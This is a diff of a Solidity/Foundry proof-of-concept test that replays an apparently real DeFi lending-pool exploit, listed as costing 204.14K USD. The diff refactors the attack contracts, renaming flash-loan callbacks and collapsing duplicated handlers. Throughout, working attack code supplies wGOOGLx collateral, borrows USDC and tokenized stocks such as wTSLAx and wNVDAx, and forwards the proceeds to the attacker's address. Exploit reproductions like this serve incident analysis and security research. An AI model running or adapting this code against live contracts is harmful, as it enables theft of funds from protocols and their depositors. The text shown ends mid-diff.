@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.20;
 
-import {Test, console2} from "forge-std/Test.sol";
 import "./Base.sol";
 
 // @KeyInfo - Total Lost : 204.14K USD
@@ -21,10 +20,6 @@ import "./Base.sol";
 // @POC Author
 // Generated PoC
 
-interface IFlashLoanTarget {
-    function flashLoan(address arg0, uint256 arg1, bytes calldata arg2) external;
-}
-
 contract AttackTest is Base {
     address constant ATTACKER_EOA = Addresses.attacker_eoa;
     address constant ATTACK_CONTRACT = Addresses.A_1F05C7_7167;
@@ -43,7 +38,7 @@ contract AttackTest is Base {
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-        _prepareProfitSnap();
+        _prepareProfit(ATTACK_CONTRACT, Addresses.attack_path_entry);
         _logBalances("Before exploit");
         _deployAttack();
         _logBalances("After exploit");
@@ -52,32 +47,16 @@ contract AttackTest is Base {
     }
 
     function _deployAttack() internal returns (OurAttack attack) {
-        _alignNonce();
+        _alignAttackerNonceF();
         attack = new OurAttack();
         require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
     }
 
-    function _alignNonce() internal {
+    function _alignAttackerNonceF() internal {
         uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
         if (currentNonce < ATTACKER_EOA_TX_NONCE) {
             vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
         }
-    }
-
-    function _prepareProfitSnap() internal {
-        _prepareProfit(ATTACK_CONTRACT, _firstAttackChild());
-    }
-
-    function _firstAttackChild() internal pure returns (address) {
-        return Addresses.attack_path_entry;
-    }
-
-    function _prepareProfit(OurAttack attack) internal {
-        _prepareProfit(address(attack), _expectedAttackChild(attack));
-    }
-
-    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
-        return address(attack.attackChild());
     }
 
     function _expectProfitLegs(address attack, address attackChild) internal override {
@@ -138,17 +117,17 @@ contract AttackTest is Base {
 contract OurAttack {
     AttackChild public attackChild;
 
-    AttackChild_1 public flashLoanChild;
+    AttackChild_1 public attackChild_1;
 
     constructor() payable {
-        AttackChild firstChild = new AttackChild();
-        require(address(firstChild) == Addresses.attack_path_entry, "unexpected attack child");
-        firstChild._approveLendingPool();
-        AttackChild_1 morphoChild = new AttackChild_1();
-        require(address(morphoChild) == Addresses.attack_child, "unexpected attack child");
-        morphoChild._acceptSetup();
-        _strictCall(
-            address(morphoChild),
+        attackChild = new AttackChild();
+        require(address(attackChild) == Addresses.attack_path_entry, "unexpected attack child");
+        attackChild.approveLendingPool();
+        attackChild_1 = new AttackChild_1();
+        require(address(attackChild_1) == Addresses.attack_child, "unexpected attack child");
+        attackChild_1.prepareFlashLoan();
+        _decodedCall(
+            address(attackChild_1),
             abi.encodeWithSignature(
                 "execute(bytes)", hex"0000000000000000000000008b2af1a9885e4755d22ce4a49f7a525a33f1c9e4"
             )
@@ -161,11 +140,7 @@ contract OurAttack {
         if (msg.data.length == 0) return;
     }
 
-    function bindAttackChild(address attackChildAddress) external {
-        attackChild = AttackChild(payable(attackChildAddress));
-    }
-
-    function _strictCall(address target, bytes memory data) internal {
+    function _decodedCall(address target, bytes memory data) internal {
         (bool ok,) = target.call(data);
         require(ok, "attack child dispatch failed");
     }
@@ -177,546 +152,74 @@ contract AttackChild {
     fallback() external payable {
         if (msg.data.length == 0) return;
         if (msg.sig == 0x8259ef5f) {
-            {
-                uint256 assetWord;
-                assembly { assetWord := calldataload(4) }
-                if (assetWord == 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) {
-                    _handleFlashLoanCa40();
-                    bytes memory ret = hex"";
-                    assembly { return(add(ret, 32), mload(ret)) }
-                }
+            uint256 assetWord;
+            assembly { assetWord := calldataload(4) }
+            if (assetWord == uint256(uint160(Addresses.USDC))) {
+                _borrowUsdc();
+                _returnEmpty();
             }
-            {
-                uint256 assetWord;
-                assembly { assetWord := calldataload(4) }
-                if (assetWord == 0x000000000000000000000000c88fcd8b874fdb3256e8b55b3decb8c24eab4c02) {
-                    _handleFlashLoanCa43();
-                    bytes memory ret = hex"";
-                    assembly { return(add(ret, 32), mload(ret)) }
-                }
+            if (assetWord == uint256(uint160(Addresses.wSPYx))) {
+                _borrowWspyx();
+                _returnEmpty();
             }
-            {
-                uint256 assetWord;
-                assembly { assetWord := calldataload(4) }
-                if (assetWord == 0x000000000000000000000000dbd9232fee15351068fe02f0683146e16d9f2cea) {
-                    _handleFlashLoanCa42();
-                    bytes memory ret = hex"";
-                    assembly { return(add(ret, 32), mload(ret)) }
-                }
+            if (assetWord == uint256(uint160(Addresses.wQQQx))) {
+                _borrowWqqqx();
+                _returnEmpty();
             }
-            {
-                uint256 assetWord;
-                assembly { assetWord := calldataload(4) }
-                if (assetWord == 0x000000000000000000000000266e5923f6118f8b340ca5a23ae7f71897361476) {
-                    _handleFlashLoanCa44();
-                    bytes memory ret = hex"";
-                    assembly { return(add(ret, 32), mload(ret)) }
-                }
+            if (assetWord == uint256(uint160(Addresses.wMSTRx))) {
+                _borrowWmstrx();
+                _returnEmpty();
             }
-            {
-                uint256 assetWord;
-                assembly { assetWord := calldataload(4) }
-                if (assetWord == 0x00000000000000000000000093e62845c1dd5822ebc807ab71a5fb750decd15a) {
-                    _handleFlashLoanCa41();
-                    bytes memory ret = hex"";
-                    assembly { return(add(ret, 32), mload(ret)) }
-                }
+            if (assetWord == uint256(uint160(Addresses.wNVDAx))) {
+                _borrowWnvdax();
+                _returnEmpty();
             }
-            {
-                uint256 assetWord;
-                assembly { assetWord := calldataload(4) }
-                if (assetWord == 0x00000000000000000000000043680abf18cf54898be84c6ef78237cfbd441883) {
-                    _handleFlashLoanCa48();
-                    bytes memory ret = hex"";
-                    assembly { return(add(ret, 32), mload(ret)) }
-                }
+            if (assetWord == uint256(uint160(Addresses.wTSLAx))) {
+                _borrowWtslax();
+                _returnEmpty();
             }
-            _handleFlashLoanCa40();
-            bytes memory ret = hex"";
-            assembly { return(add(ret, 32), mload(ret)) }
+            _borrowUsdc();
+            _returnEmpty();
         }
         if (msg.sig == 0xc1d5a727) {
-            uint256 dispatchOrdinal = _nextDispatch(0xc1d5a727);
-            if (dispatchOrdinal == 0) {
-                _handleFlashLoanCa45();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 1) {
-                _handleFlashLoanCa46();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 2) {
-                _handleFlashLoanCa47();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 3) {
-                _handleFlashLoanCall();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 4) {
-                _handleFlashLoanCa2();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 5) {
-                _handleFlashLoanCa3();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 6) {
-                _handleFlashLoanCa4();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 7) {
-                _handleFlashLoanCa5();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 8) {
-                _handleFlashLoanCa6();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 9) {
-                _handleFlashLoanCa7();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 10) {
-                _handleFlashLoanCa8();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 11) {
-                _handleFlashLoanCa9();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 12) {
-                _handleFlashLoanCa10();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 13) {
-                _handleFlashLoanCa11();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 14) {
-                _handleFlashLoanCa12();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 15) {
-                _handleFlashLoanCa13();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 16) {
-                _handleFlashLoanCa14();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 17) {
-                _handleFlashLoanCa15();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 18) {
-                _handleFlashLoanCa16();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 19) {
-                _handleFlashLoanCa17();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 20) {
-                _handleFlashLoanCa18();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 21) {
-                _handleFlashLoanCa19();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 22) {
-                _handleFlashLoanCa20();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 23) {
-                _handleFlashLoanCa21();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 24) {
-                _handleFlashLoanCa22();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 25) {
-                _handleFlashLoanCa23();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 26) {
-                _handleFlashLoanCa24();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 27) {
-                _handleFlashLoanCa25();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 28) {
-                _handleFlashLoanCa26();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 29) {
-                _handleFlashLoanCa27();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 30) {
-                _handleFlashLoanCa28();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 31) {
-                _handleFlashLoanCa29();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 32) {
-                _handleFlashLoanCa30();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 33) {
-                _handleFlashLoanCa31();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 34) {
-                _handleFlashLoanCa32();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 35) {
-                _handleFlashLoanCa33();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 36) {
-                _handleFlashLoanCa34();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 37) {
-                _handleFlashLoanCa35();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 38) {
-                _handleFlashLoanCa36();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            if (dispatchOrdinal == 39) {
-                _handleFlashLoanCa37();
-                bytes memory ret = hex"";
-                assembly { return(add(ret, 32), mload(ret)) }
-            }
-            _handleFlashLoanCa45();
-            bytes memory ret = hex"";
-            assembly { return(add(ret, 32), mload(ret)) }
+            _supplyCollateral();
+            _returnEmpty();
         }
     }
 
-    function flashLoanCallback7() external payable {
-        _handleFlashLoanCa45();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback8() external payable {
-        _handleFlashLoanCa46();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback9() external payable {
-        _handleFlashLoanCa47();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback10() external payable {
-        _handleFlashLoanCall();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback11() external payable {
-        _handleFlashLoanCa2();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback12() external payable {
-        _handleFlashLoanCa3();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback13() external payable {
-        _handleFlashLoanCa4();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback14() external payable {
-        _handleFlashLoanCa5();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback15() external payable {
-        _handleFlashLoanCa6();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback16() external payable {
-        _handleFlashLoanCa7();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback17() external payable {
-        _handleFlashLoanCa8();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback18() external payable {
-        _handleFlashLoanCa9();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback19() external payable {
-        _handleFlashLoanCa10();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback20() external payable {
-        _handleFlashLoanCa11();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback21() external payable {
-        _handleFlashLoanCa12();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback22() external payable {
-        _handleFlashLoanCa13();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback23() external payable {
-        _handleFlashLoanCa14();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback24() external payable {
-        _handleFlashLoanCa15();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback25() external payable {
-        _handleFlashLoanCa16();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback26() external payable {
-        _handleFlashLoanCa17();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback27() external payable {
-        _handleFlashLoanCa18();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback28() external payable {
-        _handleFlashLoanCa19();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback29() external payable {
-        _handleFlashLoanCa20();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback30() external payable {
-        _handleFlashLoanCa21();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback31() external payable {
-        _handleFlashLoanCa22();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback32() external payable {
-        _handleFlashLoanCa23();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback33() external payable {
-        _handleFlashLoanCa24();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback34() external payable {
-        _handleFlashLoanCa25();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback35() external payable {
-        _handleFlashLoanCa26();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback36() external payable {
-        _handleFlashLoanCa27();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback37() external payable {
-        _handleFlashLoanCa28();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback38() external payable {
-        _handleFlashLoanCa29();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback39() external payable {
-        _handleFlashLoanCa30();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback40() external payable {
-        _handleFlashLoanCa31();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback41() external payable {
-        _handleFlashLoanCa32();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback42() external payable {
-        _handleFlashLoanCa33();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback43() external payable {
-        _handleFlashLoanCa34();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback44() external payable {
-        _handleFlashLoanCa35();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback45() external payable {
-        _handleFlashLoanCa36();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    function flashLoanCallback46() external payable {
-        _handleFlashLoanCa37();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+    function supplyCollateral() external payable {
+        _supplyCollateral();
+        _returnEmpty();
     }
 
     function flashLoanCallback2() external payable {
-        _handleFlashLoanCa40();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+        _borrowUsdc();
+        _returnEmpty();
     }
 
     function flashLoanCallback5() external payable {
-        _handleFlashLoanCa43();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+        _borrowWspyx();
+        _returnEmpty();
     }
 
     function flashLoanCallback4() external payable {
-        _handleFlashLoanCa42();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+        _borrowWqqqx();
+        _returnEmpty();
     }
 
     function flashLoanCallback6() external payable {
-        _handleFlashLoanCa44();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+        _borrowWmstrx();
+        _returnEmpty();
     }
 
     function flashLoanCallback3() external payable {
-        _handleFlashLoanCa41();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+        _borrowWnvdax();
+        _returnEmpty();
     }
 
     function flashLoanCallback() external payable {
-        _handleFlashLoanCa48();
-        bytes memory ret = hex"";
-        assembly { return(add(ret, 32), mload(ret)) }
+        _borrowWtslax();
+        _returnEmpty();
     }
 
     function replayProfit() external {
@@ -782,16 +285,7 @@ contract AttackChild {
         }
     }
 
-    bytes32 private constant MORPHO_CALLBACK = keccak256("poc.morpho.callback");
-    mapping(bytes32 => bool) private _callbackDone;
-
-    mapping(bytes4 => uint256) private _dispatchCursor;
     mapping(bytes32 => bool) private _profitSettlementFlag;
-
-    function _nextDispatch(bytes4 sig) internal returns (uint256 ordinal) {
-        ordinal = _dispatchCursor[sig];
-        _dispatchCursor[sig] = ordinal + 1;
-    }
 
     function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
         return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
@@ -801,283 +295,53 @@ contract AttackChild {
         _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
     }
 
-    function _handleFlashLoanCa48() internal {
+    function _borrowWtslax() internal {
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
             .borrow(Addresses.wTSLAx, 37589277017463227843, 2, uint16(0), address(this));
         IERC20Like(Addresses.wTSLAx).transfer(Addresses.attacker_eoa, 37589277017463227843);
     }
 
-    function _handleFlashLoanCa40() internal {
+    function _borrowUsdc() internal {
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6).borrow(Addresses.USDC, 384215572188, 2, uint16(0), address(this));
         IERC20Like(Addresses.USDC).transfer(Addresses.attack_child, 384215572188);
     }
 
-    function _handleFlashLoanCa41() internal {
+    function _borrowWnvdax() internal {
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
             .borrow(Addresses.wNVDAx, 99854367795581762710, 2, uint16(0), address(this));
         IERC20Like(Addresses.wNVDAx).transfer(Addresses.attacker_eoa, 99854367795581762710);
     }
 
-    function _handleFlashLoanCa42() internal {
+    function _borrowWqqqx() internal {
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
             .borrow(Addresses.wQQQx, 62969726160938091585, 2, uint16(0), address(this));
         IERC20Like(Addresses.wQQQx).transfer(Addresses.attacker_eoa, 62969726160938091585);
     }
 
-    function _handleFlashLoanCa43() internal {
+    function _borrowWspyx() internal {
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
             .borrow(Addresses.wSPYx, 122196850288612833306, 2, uint16(0), address(this));
         IERC20Like(Addresses.wSPYx).transfer(Addresses.attacker_eoa, 122196850288612833306);
     }
 
-    function _handleFlashLoanCa44() internal {
+    function _borrowWmstrx() internal {
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
             .borrow(Addresses.wMSTRx, 293123092617121394703, 2, uint16(0), address(this));
         IERC20Like(Addresses.wMSTRx).transfer(Addresses.attacker_eoa, 293123092617121394703);
     }
 
-    function _handleFlashLoanCa45() internal {
+    function _supplyCollateral() internal {
         uint256 supplyLiveAmount = 1414889025557658614;
         IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
             .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
     }
 
-    function _handleFlashLoanCa46() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa47() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCall() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa2() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa3() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa4() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa5() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa6() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa7() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa8() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa9() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa10() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa11() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa12() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa13() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa14() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa15() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa16() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa17() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa18() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa19() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa20() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa21() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa22() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa23() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
